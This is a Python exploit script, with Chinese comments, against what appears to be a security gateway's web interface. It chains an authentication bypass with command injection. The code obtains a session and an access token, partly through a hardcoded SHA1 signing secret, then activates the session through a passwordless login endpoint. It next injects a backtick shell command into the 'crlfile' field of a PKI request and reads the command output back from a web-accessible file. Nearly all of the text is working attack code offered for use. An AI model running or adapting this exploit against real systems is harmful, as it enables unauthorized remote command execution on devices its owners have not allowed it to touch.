#-*- coding:utf-8 -*-
import requests
import urllib3
import re
import ssl
import json
import hashlib
import time
import sys
from lxml import html
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 创建自定义适配器
class TLSAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.set_ciphers("DEFAULT")
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)


def request_new():
    session = requests.Session()
    session.mount('https://', TLSAdapter())
    return session

#获取sessionid
def get_session(url, ssl_request):
    # 发送请求
    response = ssl_request.get(url, verify=False,allow_redirects=False)
    match = re.search(r'__s_sessionid__=(\w+)', response.headers.get('Set-Cookie'))
    if match:
        session_id = match.group(1)
        return session_id
    else:
        # print("Session ID not found")
        return False

def sha1_str(data):
    news = str(data).encode()                 #先变成bytes类型才能加密
    sha1 = hashlib.sha1(news).hexdigest()     #加密
    return sha1

def get_access_token(url, ssl_request, hader):
    path = "/auth"
    url = url + path
    v1str = "username=admin&lms_ip=127.0.0.1&lms_port=80&client_id=123&uuid=456"
    data = {
        "username": "admin",
        "lms_ip": "127.0.0.1",
        "lms_port": "80",
        "client_id": "123",
        "uuid": "456"
    }
    Timestamp = int(time.time())
    vi = "5678471853609579508"
    v1str = v1str + str(Timestamp) + vi
    #print("v1str:{}".format(v1str))
    sha1_str_value = sha1_str(v1str)
    hader.update({
        'X-Authorization': sha1_str_value,
        'Referer': url+'/login',
        'X-Timestamp': str(Timestamp),
    })
    
    response = ssl_request.post(url, data=data, headers=hader, verify=False, allow_redirects=False)
    jsondata = json.loads(response.text)
    if jsondata['status'] != '0' or jsondata['access_token'] == 'csmp_check_sign_error':
        print("error")
        exit(0)
    else:
        access_token = jsondata['access_token']
        return access_token
    

#获取access_token,不使用参数的情况下
def get_access_token_no_param(url, ssl_request, hader):
    path = "/auth"
    # 发送请求
    url = url + path
    response = ssl_request.post(url, headers=hader, verify=False, allow_redirects=False)
    jsondata = json.loads(response.text)
    if jsondata['status'] != '0' or jsondata['access_token'] == 'csmp_check_sign_error':
        print("error")
        access_token = None
        return access_token
    else:
        access_token = jsondata['access_token']
        return access_token

#让sessionid生效    
def auth_token_no_passwd_login(url, ssl_request, hader, access_token):
    path = "auth/"+access_token+"?token="+access_token
    url = url + path
    # 发送请求
    response = ssl_request.get(url, headers=hader, verify=False, allow_redirects=False)
    if response.status_code == 200 or response.text == '8':
        print("Error")
        return False
    elif response.status_code == 302 and response.headers['Location'] == '/':
        print("OK")
        return True
        

#通过访问根路径，来获取后续的token
def get_hader_token(url, ssl_request, hader):
    # 发送请求
    response = ssl_request.get(url, headers=hader, verify=False, allow_redirects=False)
    doc = html.fromstring(response.text)
    if response.status_code == 200:
        token_value = doc.xpath('//meta[@id="token"]/@content')
        # 输出结果
        if token_value:
            print("Token value:", token_value[0])
            return token_value[0]
        else:
            print("Token not found.")
    elif response.status_code == 302 or response.headers['Location'] == '/login':
        print("sessinod invalid")
        return False

#执行命令注入
def run_command_injection(url, ssl_request, hader):
    path = "/data.html"
    url = url + path
    # 发送请求
    data = [{"head":{"function":"set_pki_trust_auth","module":"pki","page_index":1,"page_size":20},    "body":{
        "pki_auth_cp":{
            "name":"",
            "crlfile":"`whoami > /secgate/webui/web/config`" 
        }
    }}]
    response = ssl_request.post(url, data=json.dumps(data), headers=hader, verify=False, allow_redirects=False)
    if response.status_code != 200:
        print("Error")
        return False
    else:
        jsondata = json.loads(response.text)
        if jsondata['head']['error_code'] == 3:
            print("run_command_injection function [OK]")
            return True
        else:
            print("run_command_injection function [Error]")
            return False

#回显
def command_response(url, ssl_request, hader):
    path = "/web/config"
    url = url + path
    # 发送请求
    response = ssl_request.get(url, headers=hader, verify=False, allow_redirects=False)
    return response.text


#初始化SSL
ssl_request = request_new()
url = sys.argv[1]
#获取sessionid
cookie_session = get_session(url, ssl_request)
if not cookie_session:
    print("get_session function [Error]")
    ssl_request.close()
    exit(0)
else:
    print("get_session function [OK]{}".format(cookie_session))
    #设置请求头
    hader = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Cookei': '__s_sessionid__='+cookie_session,
    }
    #获取access_token,这里有两个函数一个是有参数的，因为我看伪代码是需要参数进行传递的，但是我发现不需要参数也可以获取到access_token
    access_token = get_access_token_no_param(url, ssl_request, hader)
    if not access_token:
        access_token = get_access_token(url, ssl_request, hader)
        if not access_token:
            print("get_access_token function [Error]")
            ssl_request.close()
            exit(0)
    else:
        print("get_access_token function [OK]{}".format(access_token))
        #让sessionid生效
        if  auth_token_no_passwd_login(url, ssl_request, hader, access_token):
            print("auth_token_no_passwd_login function [OK]")
            token = get_hader_token(url, ssl_request, hader)
            if not token:
                print("get_hader_token function [Error]")
                ssl_request.close()
                exit(0)
            else:
                print("get_hader_token function [OK]{}".format(token))
                #更新请求头
                hader.update({
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'token': token,
                    'Referer': url+'/login',
                })
                #执行命令注入
                if run_command_injection(url, ssl_request, hader):
                    print("run_command_injection function [OK]")
                    responsedata = command_response(url, ssl_request, hader)
                    print(responsedata)
                    ssl_request.close()
                    exit(0)
                else:
                    print("run_command_injection function [Error]")
                    ssl_request.close()
                    exit(0)
        else:
            print("auth_token_no_passwd_login function [Error]")
            ssl_request.close()
            exit(0)
